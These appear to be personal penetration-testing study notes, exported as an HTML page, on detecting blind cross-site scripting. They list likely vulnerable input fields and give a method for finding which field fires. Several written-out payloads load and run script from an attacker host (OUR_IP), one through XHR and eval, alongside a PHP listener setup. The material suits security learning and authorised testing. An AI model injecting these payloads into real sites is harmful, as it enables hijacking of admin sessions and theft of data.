<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. Blind XSS Detection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>1. Blind XSS Detection</h1><br/><br /><strong>What is a Blind XSS</strong><br />Blind XSS is a type of cross site scripting (XSS), where the attacker “blindly” deploy a payload on a web page that will save it to a persistent state (like in a database, or in a log file). <br />The payload is going to be triggered only when the attacker’s input (stored by the web server) is executed as a malicious script in another part of the application (usually a page we don&#39;t have access to) or another application.<br /><br /><strong>Input that usually trigger a Blind XSS</strong><br />Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins)<br />Input that could trigger a Blind XSS:<br />   ◇ Contact Forms<br />   ◇ Reviews<br />   ◇ User Details<br />   ◇ Support Tickets<br />   ◇ HTTP User-Agent header<br /><br /><strong>Notes the responses from the server</strong><br />Below, responses from the browser that can indicate that our input will be handled by the Admin in a page we do not have access to. <br />    <a href=""><img src="images/2470-1.png" alt="images/2470-1.png" /></a><br />    <a href=""><img src="images/2470-2.png" alt="images/2470-2.png" /></a><br /><br /><strong>how to detect a Blind XSS vulnerability if we cannot see how the output is handled?</strong><br />We can use a JavaScript payload that sends an HTTP request back to our server.<br />If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.<br />However, this introduces two issues:<br />1. How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can&#39;t know which of them did.<br />2. How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?<br /><br /><br /><br /><br /><strong><h2>Load a Remote Script</h2></strong><br />• In HTML, with JavaScript we can include a remote script by providing its URL. <br />    <div class="codebox"><pre>&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</pre></div><br />• As script name we can use the name of the field that we are targeting, such that when we get the request on the attacker machine, we can identify the vulnerable input field that executed the script:<br />    <div class="codebox"><pre>&lt;script src=&quot;http://OUR_IP/[INPUT_FIELD].js&quot;&gt;&lt;/script&gt;</pre></div><br />    <span style="text-decoration:underline;">Note:</span> we can also not use the extension .js if we think that this could trigger a WAF<br />• Payloads from: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss</a><br />    To detect if a field is vulnerable we can use one of the following payload:<br />    <div class="codebox"><pre>&lt;script src=http://OUR_IP&gt;&lt;/script&gt;</pre></div><br />    <div class="codebox"><pre>&#39;&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;</pre></div><br />    <div class="codebox"><pre>&quot;&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;</pre></div><br />    <div class="codebox"><pre>javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;); a.src=\&#39;http://OUR_IP\&#39;;document.body.appendChild(a)&#39;)</pre></div><br />    <div class="codebox"><pre>&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//OUR_IP&quot;);a.send();&lt;/script&gt;</pre></div><br />    <div class="codebox"><pre>&lt;script&gt;$.getScript(&quot;http://OUR_IP&quot;)&lt;/script&gt;</pre></div><br />    <a href=""><img src="images/2470-3.png" alt="images/2470-3.png" /></a><br />    It need to be between &lt;script&gt; because we need with this parameter to call a javascript file on the attacker machine (at point 2)<br /><br />1. Start a Listener before start sending test payloads, using netcat or php. <br />    As we have done in the section:<br />    <a href="ite_Scripting(XSS)--Escalating_the_Attack_(How_can_be_used)--Phishing--Login_Form_Injection--4._Set_Up_Listerner_to_Steal_the_Credentials.html">Phishing → Login Form Injection → Set Up Listener to Steal the Credentials</a> <br />    <div class="codebox"><pre>mkdir /tmp/tmpserver<br />cd /tmp/tmpserver<br />sudo php -S 0.0.0.0:80</pre></div><br />    <a href=""><img src="images/2470-4.png" alt="images/2470-4.png" /></a><code><br /></code><br /><br />2. Send Test Payloads to check which parameter is vulnerable to Blind XSS<br />    <div class="codebox"><pre>&lt;script src=http://OUR_IP/[INPUT_FIELD_1]&gt;&lt;/script&gt;</pre></div><br />    <div class="codebox"><pre>&lt;script src=http://OUR_IP/[INPUT_FIELD_2]&gt;&lt;/script&gt;</pre></div><br />    <div class="codebox"><pre>&lt;script src=http://OUR_IP/[INPUT_FIELD_...]&gt;&lt;/script&gt;</pre></div><br /><br />   ◇ <span style="text-decoration:underline;">How reduce the number of potentially vulnerable input fields we need to test</span>:<br />      ▪ email field → usually must match an email format. We could try to bypass the client side validation, but usually the validation is done both on the front-end and the back-end.<br />      ▪ password field → passwords are usually hashed and not usually shown in cleartext<br /><br /><br />3. For every payload sent, check the listener to see if anything called our server.<br />    Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.<br />    <a href=""><img src="images/2470-5.png" alt="images/2470-5.png" /></a><br />    give an orange 404 error because we still not have created a index.php file on the attacker machine, but we had a connection with our attacker machine!<br /></div>
</body>
</html>
